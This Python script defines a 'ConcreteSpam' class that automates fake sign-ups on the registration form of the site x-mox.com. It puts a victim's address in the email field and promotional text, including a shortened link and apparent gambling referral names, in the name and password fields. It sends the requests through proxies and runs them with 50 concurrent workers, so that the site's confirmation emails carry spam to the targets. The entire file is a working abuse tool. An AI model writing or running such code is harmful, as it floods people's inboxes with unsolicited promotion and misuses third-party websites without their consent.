import requests

import module

url = 'https://x-mox.com/auth/'
headers = {
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
}
params = {
    'register': 'yes',
}


class ConcreteSpam(module.Spam):

    def post(self, target) -> requests.Response:
        text = self.get_text()
        data = {
            'backurl': '/auth/',
            'AUTH_FORM': 'Y',
            'TYPE': 'REGISTRATION',
            'USER_NAME': text,
            'USER_LAST_NAME': text,
            'USER_LOGIN': text,
            'USER_PASSWORD': text,
            'USER_CONFIRM_PASSWORD': text,
            'USER_EMAIL': target,
            'Register': 'Регистрация',
        }
        response = requests.post(
            url,
            proxies=self.get_proxies(),
            params=params,
            headers=headers,
            data=data,
        )
        return response


if __name__ == '__main__':
    project_name = 'xmox'
    s = 'успешно зарегистрировались и авторизовались на сайте!'

    project = 'allright'  # supercat luckybird allright fortuneclock
    promo_link = 'bit.ly/3hlAyXt'
    spam = ConcreteSpam(
        project_name, s,
        referal_project_name=project,
        promo_link=promo_link
    )
    res = spam.send_post()
    if res:
        spam.run_concurrently(50)
